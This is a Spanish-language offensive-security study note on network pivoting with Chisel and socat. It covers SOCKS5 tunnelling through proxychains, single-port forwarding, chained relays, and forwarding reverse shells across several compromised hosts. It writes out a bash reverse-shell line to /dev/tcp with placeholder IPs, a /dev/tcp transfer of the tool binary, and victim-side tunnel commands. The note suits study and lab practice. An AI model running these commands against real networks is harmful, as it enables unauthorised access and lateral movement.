
En este documento veremos como hacer una tunelizacion parcial (solo un puerto) o total (toda la conexión por TCP).
# Uso general

Chisel es una herramienta de tunelizacion TCP, en la cual tenemos clientes y servidores, vamos a hacer el caso mental de que tenemos una red con 3 maquinas, atacante, expuesta e interna:


![[roadmap.png]]


En este caso, facilmente podriamos tener acceso a la maquina expuesta utilizando ssh o una reverse shell, pero que pasa si queremos tener una reverse shell hasta la maquina interna?, en este caso necesitaremos de tunelizar la conexion para que llegue a nosotros.

Chisel utiliza una modalidad de cliente/servidor, en donde nosotros como atacantes estaremos a la escucha y la maquina expuesta (de la que tenemos control) se conectará a nosotros.


Es Importante entender la estructura basica de chisel:

### Server (Atacantes)

```shell
sudo chisel server --reverse -p 8080
```

### Cliente (Victima)

```shell
sudo chisel client {IP_SERVER}:{PUERTO_SERVER}  R:<NUEVO_PUERTO_ATACANTE›:<HOST_DESTINO›:<PUERTO DESTINO>
```


Lo que hace chisel es establecer un tunel, un tunel es una conexion


-----
# Instalación

### En la maquina victima

Podemos encontrar un binario facilmente pasable [aquí](https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz) (Hay que descomprimirlo), y lo podemos pasar facilmente usando nc
#### Del lado del atacante:

```Shell
sudo nc -lvnp < chisel
```
####  Del lado de la victima:

```shell
cat < /dev/tcp/{IP_ATACANTE}/{PUERTO} > chisel
```

-----

# Tunelización total (socks5)

### Configuración proxychains4

Para esto vamos a usar una conexión socks5, tenemos que asegurarnos que tenemos proxychains, y ademas, agregar la siguiente linea al final del archivo /etc/proxychains4.conf:

```shell
socks5 127.0.0.1 1080
```

### Chisel Use
#### Atacante

```ruby
chisel server --reverse -p {PUERTO}
```

#### Victima

```ruby
./chisel client {IP_ATACANTE}:{PUERTO} R:socks
```

#### Uso de tunelización

Ahora podemos usar proxychains, para que todos los paquetes del comando que usemos se redirijan usando socks5 hacia el objetivo, importante, si se va a usar Nmap, usarlo junto las opciones `-Pn -sT`:

```ruby
proxychains nmap -sT -Pn --min-rate 5000 -p- {IP}
```

------

# Tunelizacion parcial (Puerto especifico)

#### Atacante

```ruby
chisel server --reverse -p {PUERTO}
```

#### Victima

```ruby
./chisel client {IP_ATACANTE}:{PUERTO} R:8080:192.168.1.89:80
```

El puerto 8080 de nuestra maquina atacante se transforma en el puerto 80 del host destino (192.168.1.89)

----
# Tunelizacion concatenada

Para esto tenemos que mezclar socat y chisel, usaremos chisel para el cliente y el servidor, y socat para empujar las peticiones:

Para este escenario vamos a plantear las diferentes maquinas:

```
[MAQUINA A (Atacante)] <-> [MAQUINA B (Inermediaria)] <-> [MAQUINA C (DESTINO)]
```

Dependiendo de lo que queramos hacer los comandos van a variar, ya que no es lo mismo tener una reverseshell proveniente del objetivo a solo una enumeración al objetivo:

## Llegar al objetivo (NMAP, HTTP, Etc ) 

![[Pasted image 20260525223306.png]]
#### Comandos

 ***Atacante***

```ruby
chisel server --reverse -p 4444
```

***Intermediario***

```ruby
chisel client 192.168.0.20:4444

# En otra terminal:

socat TCP-LISTEN:4455,fork TCP:192.168.0.20:4444
```

***Proxy***

```ruby
chisel client 10.10.0.20:4455 R:8888:socks
```


Aqui lo que estamos haciendo es , ponernos a la escucha en la maquina atacante con chisel, esto abre un puerto en nuestra maquina, el 4444, posteriormente obtenemos una [[#Tunelización total (socks5)]] tradicional (porque de alguna forma tenemos que llegar a la maquina "Destino").

Aquí es donde se viene lo interensante, en la maquina intermediaria vamos a iniciar socat que es una especie de tobogán que va recibir los paquetes por cierto puerto y los va a enviar a una ip  y puerto especificos (en este caso al servidor que tenemos montado en chisel) de tal forma que la conexión quedaria de la siguiente forma:


1. Enviamos el comando de chisel client en la maquina ***`Destino`*** apuntando al ***`puerto en el que Socat está a la escucha`***


2. La maquina intermediaria recibe con socat la conexión y la reenvia a la dirección especificada `192.168.0.20:4444`


3. Recibimos la conexión en el, chisel server y se abre en nuestra maquina el puerto especificado en el chisel cliente ***`R:8888:socks`*** 

4. Debemos configurar el proxychains para que `ADEMAS` de recibir una conexión socks por 1080 tambien lo haga de 8888, de tal forma que quedaría algo así:

![[Pasted image 20260525173906.png]]

-----

## Obtener una revershell

Bueno aqui varia el tema, ya que las maquinas intermediarias actuaran como "toboganes" para que recibamos la revers shell en nuestra maquina atacante, el problema es que la herramienta varia si la maquina intermediaria es windows o linux, si es linux vamos a usar socat,  el entorno final se veria algo así:

```
[MAQUINA A (Atacante)] <-> [MAQUINA B (Inermediaria)] <-> [MAQUINA C (Intermediaria)] <-> [MAQUINA D (Objetivo)]
```


![[Pasted image 20260525231149.png]]

Para resumir lo que usamos para obtener la reverseshell es exclusivamente socat, en todo el proceso de revers shell no usamos chisel, PERO, si ves que hay comandos de chisel en la imagen es porque pues de alguna forma tenemos que llegar a la maquina objetivo y ejecutar la revershell (obvio).

El flujo seria el siguiente:

1. ***Objetivo*** envia revershell tradicional (***``/bin/bash -c '/bin/bash -i >& /dev/tcp/{IP}/{PUERTO}'``***) a maquina C

2. ``Maquina C`` redirige ese trafico usando socat a ``Maquina B``, la cual a su vez envia todo ese trafico finalmente a nc, por eso digo que es como una especie de tobogán

### IMPORTANTE:

Este paso (2) se puede hacer las veces que se quiera, es decir, si ahora quisieramos enviarnos una reverse shell desde alguna maquina que hayamos atacado con Objetivo, tendriamos que hacer un socat que redirija de objetivo -> Maquina C -> Maquina B -> Maquina A, y asi sucesivamente.




